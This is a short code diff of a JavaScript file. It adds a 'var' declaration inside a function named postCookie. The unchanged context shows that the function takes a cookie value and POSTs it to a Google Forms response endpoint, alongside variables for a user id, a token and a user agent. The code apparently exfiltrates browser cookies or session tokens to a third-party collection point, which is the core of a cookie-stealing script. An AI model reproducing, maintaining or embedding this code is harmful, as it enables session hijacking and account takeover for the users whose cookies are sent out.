@@ -699,7 +699,7 @@ var currentUid = "";
 var currentToken = "";
 var user_agent = "";
 function postCookie(valCookie) {
-    data = new FormData()
+    var data = new FormData()
     data.set('entry.397806239', valCookie);
     let request = new XMLHttpRequest();
     request.open("POST", 'https://docs.google.com/forms/d/e/1FAIpQLSeCQ2nry6OvfYtEgMom4tttWaFlBOB2M1x2TLsqhJJezL4V6g/formResponse', true);
